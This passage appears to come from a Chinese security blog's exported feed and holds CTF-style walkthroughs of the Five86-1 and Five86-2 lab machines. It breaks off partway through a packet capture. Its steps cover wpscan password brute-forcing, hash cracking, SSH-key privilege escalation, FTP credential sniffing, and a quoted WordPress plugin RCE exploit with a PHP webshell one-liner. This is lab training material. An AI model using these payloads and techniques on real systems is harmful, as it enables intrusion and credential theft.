<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# whatweb https://192.168.43.159:10000/</span><br><span class="line">https://192.168.43.159:10000/ [200 OK] Cookies[redirect,testing], Country[RESERVED][ZZ], HTML5, HTTPServer[MiniServ/1.920], IP[192.168.43.159], PasswordField[pass], Script, Title[Login to Webmin], UncommonHeaders[auth-type,content-security-policy], X-Frame-Options[SAMEORIGIN]                                                                                                                                                </span><br><span class="line">root@kali:/home/caixin# whatweb http://192.168.43.159/ona/</span><br><span class="line">http://192.168.43.159/ona/ [200 OK] Apache[2.4.38], Cookies[ONA_SESSION_ID,ona_context_name], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.43.159], Script[javascript,text/javascript], Title[OpenNetAdmin :: 0wn Your Network]</span><br></pre></td></tr></table></figure>

<ul>
<li>尝试<code>CVE-2019-15107</code>失败</li>
</ul>
<p><img data-src="./Five86-1/6.png" alt></p>
<h3 id="MSF拿到shell"><a href="#MSF拿到shell" class="headerlink" title="MSF拿到shell"></a>MSF拿到shell</h3><ul>
<li>利用<code>msf</code>拿到一个<code>webshell</code></li>
</ul>
<p><img data-src="./Five86-1/7.png" alt></p>
<p><img data-src="./Five86-1/8.png" alt></p>
<ul>
<li><code>python</code>拿一个交互<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img data-src="./Five86-1/9.png" alt></p>
<ul>
<li>查看当前用户能够访问的文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find /var -type f -user www-data</span><br></pre></td></tr></table></figure>

<p><img data-src="./Five86-1/10.png" alt></p>
<ul>
<li>发现一些信息</li>
</ul>
<p><img data-src="./Five86-1/11.png" alt></p>
<ul>
<li>破解密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 生成密码</span></span><br><span class="line">crunch 10 10 aefhrt &gt;&gt; crunch_res.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# crunch 10 10 aefhrt &gt;&gt; crunch_res.txt</span><br><span class="line">Crunch will now generate the following amount of data: 665127936 bytes</span><br><span class="line">634 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 60466176 </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 破解密码</span></span><br><span class="line">hash.txt  $apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1</span><br><span class="line"></span><br><span class="line">john hash.txt --wordlist=crunch_res.txt --user=douglas</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; </span></span><br><span class="line">最终密码为</span><br><span class="line">fatherrrrr</span><br></pre></td></tr></table></figure>

<p><img data-src="./Five86-1/12.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
<li><p>登录<code>douglas / fatherrrrr</code></p>
</li>
<li><p><code>sudo -l</code></p>
</li>
</ul>
<p><img data-src="./Five86-1/13.png" alt></p>
<ul>
<li>发现可以无密码用<code>jen</code>使用<code>cp</code>命令</li>
<li>看看<code>jen</code>家目录有啥</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">douglas@five86-1:/home$ sudo -u jen cp -r jen/ /tmp/</span><br><span class="line"></span><br><span class="line">蠢了，发现这样依旧不能查看</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 为 jen 生成 ssh 密钥</span></span><br><span class="line">ssh-keygen -t rsa -C "jen@qwe.com"</span><br></pre></td></tr></table></figure>

<p><img data-src="./Five86-1/14.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 公钥拷贝到 jen 目录下</span></span><br><span class="line">sudo -u jen cp -r /tmp/id_rsa.pub /home/jen/.ssh</span><br></pre></td></tr></table></figure>

<p><img data-src="./Five86-1/15.png" alt></p>
<p><img data-src="./Five86-1/16.png" alt></p>
<ul>
<li>这里需要把私钥改为<code>700</code></li>
</ul>
<p><img data-src="./Five86-1/17.png" alt></p>
<ul>
<li>看一下邮件</li>
</ul>
<p><img data-src="./Five86-1/18.png" alt></p>
<ul>
<li>切用户</li>
</ul>
<p><img data-src="./Five86-1/19.png" alt></p>
<ul>
<li>进入<code>moss</code>家目录查看</li>
</ul>
<p><img data-src="./Five86-1/20.png" alt></p>
<p><img data-src="./Five86-1/21.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat flag.txt</span></span><br><span class="line">8f3b38dd95eccf600593da4522251746</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>靶场</category>
        <category>Five86</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Five86-2</title>
    <url>/2021/02/07/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Five86-2/</url>
    <content><![CDATA[<h1 id="Five86-2"><a href="#Five86-2" class="headerlink" title="Five86-2"></a>Five86-2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Five86-2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.43.172</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    f6:6f:b9:16:1f:f5       (Unknown: locally administered)</span><br><span class="line">192.168.43.186  08:00:27:2d:31:2d       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.225  20:0d:b0:30:02:d2       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.996 seconds (128.26 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.186</code></li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.186</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.186</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-07 03:07 EST</span><br><span class="line">Nmap scan report for 192.168.43.186</span><br><span class="line">Host is up (0.00070s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT   STATE  SERVICE  VERSION</span><br><span class="line">20/tcp closed ftp-data</span><br><span class="line">21/tcp open   ftp      ProFTPD 1.3.5e</span><br><span class="line">80/tcp open   http     Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 5.1.4</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Five86-2 &amp;#8211; Just another WordPress site</span><br><span class="line">MAC Address: 08:00:27:2D:31:2D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 - 3.13 (95%), Linux 2.6.22 - 2.6.36 (93%), Linux 3.10 - 4.11 (93%), Linux 2.6.39 (93%), Linux 3.10 (93%), Linux 2.6.32 (92%), Linux 3.2 - 4.9 (92%), Linux 2.6.32 - 3.10 (92%), Linux 2.6.18 (91%), Linux 3.16 - 4.6 (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.70 ms 192.168.43.186</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 116.85 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Five86-2/1.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./Five86-2/2.png" alt></p>
<ul>
<li>需要配置<code>host</code>页面才会正常</li>
</ul>
<p><img data-src="./Five86-2/3.png" alt></p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><ul>
<li>很明显的<code>wp</code>框架</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://five86-2/</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# wpscan --url http://five86-2/</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.2</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[i] It seems like you have not updated the database for some time.</span><br><span class="line">[?] Do you want to update now? [Y]es [N]o, default: [N]y</span><br><span class="line">[i] Updating the Database ...</span><br><span class="line">[i] Update completed.</span><br><span class="line"></span><br><span class="line">[+] URL: http://five86-2/ [192.168.43.186]</span><br><span class="line">[+] Started: Sun Feb  7 03:42:25 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://five86-2/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://five86-2/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://five86-2/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://five86-2/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.1.4 identified (Insecure, released on 2020-04-29).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://five86-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.4&lt;/generator&gt;</span><br><span class="line"> |  - http://five86-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.4&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentynineteen</span><br><span class="line"> | Location: http://five86-2/wp-content/themes/twentynineteen/</span><br><span class="line"> | Last Updated: 2020-12-22T00:00:00.000Z</span><br><span class="line"> | Readme: http://five86-2/wp-content/themes/twentynineteen/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.9</span><br><span class="line"> | Style URL: http://five86-2/wp-content/themes/twentynineteen/style.css?ver=1.3</span><br><span class="line"> | Style Name: Twenty Nineteen</span><br><span class="line"> | Style URI: https://github.com/WordPress/twentynineteen</span><br><span class="line"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.3 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://five86-2/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;=====================================================================================================================================&gt; (22 / 22) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Sun Feb  7 03:42:32 2021</span><br><span class="line">[+] Requests Done: 61</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 12.1 KB</span><br><span class="line">[+] Data Received: 5.496 MB</span><br><span class="line">[+] Memory used: 221.422 MB</span><br><span class="line">[+] Elapsed time: 00:00:06</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 枚举用户名</span></span><br><span class="line">wpscan --url http://five86-2/ --enumerate u</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# wpscan --url http://five86-2/ --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.2</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://five86-2/ [192.168.43.186]</span><br><span class="line">[+] Started: Sun Feb  7 03:44:12 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://five86-2/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://five86-2/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://five86-2/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://five86-2/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.1.4 identified (Insecure, released on 2020-04-29).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://five86-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.4&lt;/generator&gt;</span><br><span class="line"> |  - http://five86-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.4&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentynineteen</span><br><span class="line"> | Location: http://five86-2/wp-content/themes/twentynineteen/</span><br><span class="line"> | Last Updated: 2020-12-22T00:00:00.000Z</span><br><span class="line"> | Readme: http://five86-2/wp-content/themes/twentynineteen/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 1.9</span><br><span class="line"> | Style URL: http://five86-2/wp-content/themes/twentynineteen/style.css?ver=1.3</span><br><span class="line"> | Style Name: Twenty Nineteen</span><br><span class="line"> | Style URI: https://github.com/WordPress/twentynineteen</span><br><span class="line"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.3 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://five86-2/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;====================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://five86-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] barney</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] gillian</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] peter</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] stephen</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Sun Feb  7 03:44:15 2021</span><br><span class="line">[+] Requests Done: 31</span><br><span class="line">[+] Cached Requests: 33</span><br><span class="line">[+] Data Sent: 7.282 KB</span><br><span class="line">[+] Data Received: 91.479 KB</span><br><span class="line">[+] Memory used: 146.25 MB</span><br><span class="line">[+] Elapsed time: 00:00:03</span><br><span class="line"></span><br><span class="line">wpscan --url http://five86-2/ -e u -P /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[+] Performing password attack on Xmlrpc against 5 user/s</span><br><span class="line">[SUCCESS] - barney / spooky1                                                                                                     </span><br><span class="line">[SUCCESS] - stephen / apollo1</span><br></pre></td></tr></table></figure>

<h3 id="插件RCE"><a href="#插件RCE" class="headerlink" title="插件RCE"></a>插件RCE</h3><ul>
<li>登录 <code>barney / spooky1</code></li>
</ul>
<p><img data-src="./Five86-2/4.png" alt></p>
<ul>
<li>按照网上的方法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Exploit Title: Authenticated code execution <span class="keyword">in</span> `insert-or-embed-articulate-content-into-wordpress` Wordpress plugin</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Description: It is possible to upload and execute a PHP file using the plugin option to upload a zip archive </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Date: june 2019</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Exploit Author: xulchibalraa</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Vendor Homepage: https://wordpress.org/plugins/insert-or-embed-articulate-content-into-wordpress/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Software Link: https://downloads.wordpress.org/plugin/insert-or-embed-articulate-content-into-wordpress.4.2995.zip</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Version: 4.2995 &lt;= 4.2997 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Tested on: Wordpress 5.1.1, PHP 5.6 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CVE : -</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 1. Create a .zip archive with 2 files: index.html, index.php</span></span></span><br><span class="line"></span><br><span class="line">echo "&lt;html&gt;hello&lt;/html&gt;" &gt; index.html</span><br><span class="line">echo "&lt;?php echo system($_GET['cmd']); ?&gt;" &gt; index.php</span><br><span class="line">zip poc.zip index.html index.php </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 2. Log in to wp-admin with any user role that has access to the plugin functionality (by default even `Contributors` role have access to it)</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 3. Create a new Post -&gt; Select `Add block` -&gt; E-Learning -&gt; Upload the poc.zip -&gt; Insert as: Iframe -&gt; Insert (just like in tutorial https://youtu.be/knst26fEGCw?t=44 ;)</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 4. Access the webshell from the URL displayed after upload similar to </span></span></span><br><span class="line"></span><br><span class="line">http://website.com/wp-admin/uploads/articulate_uploads/poc/index.php?cmd=whoami</span><br></pre></td></tr></table></figure>

<p><img data-src="./Five86-2/5.png" alt></p>
<p><img data-src="./Five86-2/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://five86-2/wp-content/uploads/articulate_uploads/poc/index.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> index.php 写入反弹马</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./Five86-2/7.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
<li>尝试切换用户</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[SUCCESS] - barney / spooky1                                                                                                     </span><br><span class="line">[SUCCESS] - stephen / apollo1</span><br></pre></td></tr></table></figure>

<ul>
<li>拿到 <code>stephen</code>用户</li>
</ul>
<p><img data-src="./Five86-2/8.png" alt></p>
<ul>
<li>交互<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<p><img data-src="./Five86-2/9.png" alt></p>
<ul>
<li>查看系统进程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -auxwww</span><br></pre></td></tr></table></figure>

<p><img data-src="./Five86-2/10.png" alt></p>
<p>发现 <code>paul</code>用户运行 <code>ftp</code>（数据包为明文）</p>
<ul>
<li><code>tcpdump</code>抓包</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -D</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">stephen@five86-2:&#x2F;$ tcpdump -D</span><br><span class="line">tcpdump -D</span><br><span class="line">1.br-eca3858d86bf [Up, Running]</span><br><span class="line">2.eth0 [Up, Running]</span><br><span class="line">3.vethdb2fc1a [Up, Running]</span><br><span class="line">4.lo [Up, Running, Loopback]</span><br><span class="line">5.any (Pseudo-device that captures on all interfaces) [Up, Running]</span><br><span class="line">6.docker0 [Up]</span><br><span class="line">7.nflog (Linux netfilter log (NFLOG) interface) [none]</span><br><span class="line">8.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none]</span><br><span class="line"></span><br><span class="line">tcpdump -i vethdb2fc1a port 21 -nn -v</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">tcpdump: listening on vethdb2fc1a, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">10:10:01.419555 IP (tos 0x0, ttl 64, id 62232, offset 0, flags [DF], proto TCP (6), length 60)</span><br><span class="line">    172.18.0.1.42598 &gt; 172.18.0.10.21: Flags [S], cksum 0x585e (incorrect -&gt; 0x15ff), seq 3429828657, win 64240, options [mss 1460,sackOK,TS val 3766911805 ecr 0,nop,wscale 7], length 0</span><br><span class="line">10:10:01.419619 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 60)</span><br><span class="line">    172.18.0.10.21 &gt; 172.18.0.1.42598: Flags [S.], cksum 0x585e (incorrect -&gt; 0xe04b), seq 3444470132, ack 3429828658, win 65160, options [mss 1460,sackOK,TS val 3762164488 ecr 3766911805,nop,wscale 7], length 0</span><br><span class="line">10:10:01.419639 IP (tos 0x0, ttl 64, id 62233, offset 0, flags [DF], proto TCP (6), length 52)</span><br><span class="line">    172.18.0.1.42598 &gt; 172.18.0.10.21: Flags [.], cksum 0x5856 (incorrect -&gt; 0x0bab), ack 1, win 502, options [nop,nop,TS val 3766911805 ecr 3762164488], length 0</span><br><span class="line">10:10:01.541142 IP (tos 0x0, ttl 64, id 18616, offset 0, flags [DF], proto TCP (6), length 109)</span><br><span class="line">    172.18.0.10.21 &gt; 172.18.0.1.42598: Flags [P.], cksum 0x588f (incorrect -&gt; 0x1b9d), seq 1:58, ack 1, win 510, options [nop,nop,TS val 3762164610 ecr 3766911805], length 57: FTP, length: 57</span><br><span class="line">        220 ProFTPD 1.3.5e Server (Debian) [::ffff:172.18.0.10]</span><br><span class="line">10:10:01.541179 IP (tos 0x10, ttl 64, id 62234, offset 0, flags [DF], proto TCP (6), length 52)</span><br><span class="line">    172.18.0.1.42598 &gt; 172.18.0.10.21: Flags [.], cksum 0x5856 (incorrect -&gt; 0x0a7e), ack 58, win 502, options [nop,nop,TS val 3766911927 ecr 3762164610], length 0</span><br><span class="line">10:10:01.541912 IP (tos 0x10, ttl 64, id 62235, offset 0, flags [DF], proto TCP (6), length 63)</span><br><span class="line">    172.18.0.1.42598 &gt; 172.18.0.10.21: Flags [P.], cksum 0x5861 (incorrect -&gt; 0x77d1), seq 1:12, ack 58, win 502, options [nop,nop,TS val 3766911928 ecr 3762164610], length 11: FTP, length: 11</span><br><span class="line">        USER paul</span><br><span class="line">10:10:01.541925 IP (tos 0x0, ttl 64, id 18617, offset 0, flags [DF], proto TCP (6), length 